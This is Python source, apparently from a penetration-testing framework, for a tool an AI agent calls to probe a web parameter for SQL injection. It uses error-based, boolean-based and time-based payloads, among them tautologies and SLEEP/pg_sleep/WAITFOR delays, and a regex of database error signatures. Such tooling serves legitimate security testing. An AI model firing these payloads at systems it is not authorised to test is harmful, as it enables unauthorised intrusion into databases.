"""Deterministic SQL-injection testing — error, boolean, and time based.

Freeform request-by-request probing misses injections: the agent has to eyeball
error strings, guess whether a boolean flipped the result set, and it cannot time
a blind sleep reliably. This tool does all three mechanically against one
parameter and returns a clear verdict with the payload that worked, so a real
injection becomes a confirmed, reproducible finding.
"""
from __future__ import annotations

import re
import time
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from proofmark.http_client import Request
from proofmark.tools.base import Tool, ToolResult

# Database error signatures — a strong tell that unsanitized input reached SQL.
_SQL_ERRORS = re.compile(
    r"(?i)(you have an error in your SQL syntax|mysql_fetch|Warning:\s*mysqli|"
    r"valid MySQL result|PostgreSQL.*ERROR|PG::\w+Error|pg_query|psql:|syntax error at or near|"
    r"ORA-\d{5}|Oracle error|quoted string not properly terminated|"
    r"Microsoft OLE DB Provider|ODBC SQL Server Driver|Unclosed quotation mark|"
    r"SQLite/JDBCDriver|sqlite3\.OperationalError|SQLSTATE\[|near \"[^\"]*\": syntax error)"
)

_ERROR_PAYLOADS = ["'", "\"", "')", "';", "\\"]

# (label, payload template). {d} is the sleep in seconds.
_TIME_PAYLOADS = [
    ("mysql/or", "' OR SLEEP({d})-- -"),
    ("mysql/and", "' AND SLEEP({d})-- -"),
    ("postgres", "'||pg_sleep({d})--"),
    ("mssql", "'; WAITFOR DELAY '0:0:{d}'--"),
    ("numeric", " OR SLEEP({d})"),
]

_BOOL_TRUE = "' OR '1'='1"
_BOOL_FALSE = "' OR '1'='2"


class SqlInjectionTool(Tool):
    name = "sql_injection_test"
    description = (
        "Test one parameter for SQL injection three ways — error-based (DB error strings), "
        "boolean-based (a TRUE vs FALSE condition changing the result), and time-based (a blind "
        "sleep that delays the response). Give the full url, the parameter name, and where it "
        "lives (query or body). Returns which techniques fired and the payload, so you can record "
        "a confirmed finding. Time-based takes a few seconds per payload when the target is "
        "vulnerable; safe/fast when it is not."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Full target URL (include the parameter's current value)."},
            "param": {"type": "string", "description": "Name of the parameter to inject into."},
            "method": {"type": "string", "description": "HTTP method (default GET)."},
            "where": {"type": "string", "enum": ["query", "body"],
                      "description": "Where the parameter lives (default query)."},
            "body": {"type": "string", "description": "Form-encoded body, required when where=body."},
        },
        "required": ["url", "param"],
    }
    returns_untrusted_data = True

    def __init__(self, client, delay_seconds: int = 5) -> None:
        self._client = client
        self._delay = delay_seconds

    # --- request shaping ----------------------------------------------------

    def _send(self, method, url, body):
        start = time.perf_counter()
        ok, _text, ex = self._client.send(Request(method, url, {}, body))
        elapsed = time.perf_counter() - start
        return ok, (ex.status if ex else None), (ex.response_preview if ex else "") or "", elapsed

    def _with_query(self, url, param, value):
        parts = urlsplit(url)
        pairs = parse_qsl(parts.query, keep_blank_values=True)
        if not any(k == param for k, _ in pairs):
            return None
        pairs = [(k, value if k == param else v) for k, v in pairs]
        return urlunsplit(parts._replace(query=urlencode(pairs)))

    def _with_body(self, body, param, value):
        pairs = parse_qsl(body or "", keep_blank_values=True)
        if not any(k == param for k, _ in pairs):
            return None
        pairs = [(k, value if k == param else v) for k, v in pairs]
        return urlencode(pairs)

    def _variant(self, method, url, param, where, body, payload_value):
        """Return (url, body) with `param` set to payload_value, or None if absent."""
        if where == "body":
            nb = self._with_body(body, param, payload_value)
            return None if nb is None else (url, nb)
        nu = self._with_query(url, param, payload_value)
        return None if nu is None else (nu, body)

    # --- run ----------------------------------------------------------------

    def run(self, url="", param="", method="GET", where="query", body=None, **_) -> ToolResult:
        method = (method or "GET").upper()
        where = "body" if where == "body" else "query"
        base_value = self._base_value(url, param, where, body)
        if base_value is None:
            return ToolResult(
                f"Parameter '{param}' was not found in the {where}. Check the name, or set "
                "where=body and pass the form body.", is_error=True)

        # baseline
        variant = self._variant(method, url, param, where, body, base_value)
        b_ok, b_status, b_body, b_time = self._send(method, *variant)
        findings: list[str] = []

        # 1) error-based
        for payload in _ERROR_PAYLOADS:
            v = self._variant(method, url, param, where, body, base_value + payload)
            _ok, _st, rbody, _t = self._send(method, *v)
            m = _SQL_ERRORS.search(rbody)
            if m:
                findings.append(f"ERROR-BASED — payload {base_value + payload!r} triggered a DB "
                                f"error: …{rbody[max(0, m.start()-20):m.end()+40].strip()}…")
                break

        # 2) boolean-based
        vt = self._variant(method, url, param, where, body, base_value + _BOOL_TRUE)
        vf = self._variant(method, url, param, where, body, base_value + _BOOL_FALSE)
        _o, t_status, t_body, _tt = self._send(method, *vt)
        _o, f_status, f_body, _ft = self._send(method, *vf)
        if (t_status != f_status) or abs(len(t_body) - len(f_body)) > 40:
            # TRUE should track the baseline, FALSE should diverge
            if t_status == b_status and (t_status != f_status or abs(len(t_body) - len(f_body)) > 40):
                findings.append(
                    f"BOOLEAN-BASED — TRUE ({base_value + _BOOL_TRUE!r}) and FALSE "
                    f"({base_value + _BOOL_FALSE!r}) produced different responses "
                    f"(status {t_status}/{f_status}, len {len(t_body)}/{len(f_body)}).")

        # 3) time-based
        for label, tmpl in _TIME_PAYLOADS:
            payload = base_value + tmpl.format(d=self._delay)
            v = self._variant(method, url, param, where, body, payload)
            _ok, _st, _body, elapsed = self._send(method, *v)
            if elapsed - b_time >= self._delay * 0.6:
                findings.append(
                    f"TIME-BASED — payload {payload!r} ({label}) delayed the response to "
                    f"{elapsed:.1f}s (baseline {b_time:.1f}s), indicating a blind injection.")
                break

        if not findings:
            return ToolResult(
                f"No SQL injection detected on '{param}' (baseline HTTP {b_status}). Error, "
                "boolean, and time-based probes all came back negative.")
        verdict = "high" if any(f.startswith(("ERROR", "TIME")) for f in findings) else "medium"
        lines = "\n".join(f"  • {f}" for f in findings)
        return ToolResult(
            f"SQL INJECTION LIKELY on '{param}' (confidence: {verdict}).\n{lines}\n"
            "Record the finding citing the payload above; replay it once to corroborate.")

    def _base_value(self, url, param, where, body) -> str | None:
        source = parse_qsl(body or "", keep_blank_values=True) if where == "body" \
            else parse_qsl(urlsplit(url).query, keep_blank_values=True)
        for k, v in source:
            if k == param:
                return v
        return None
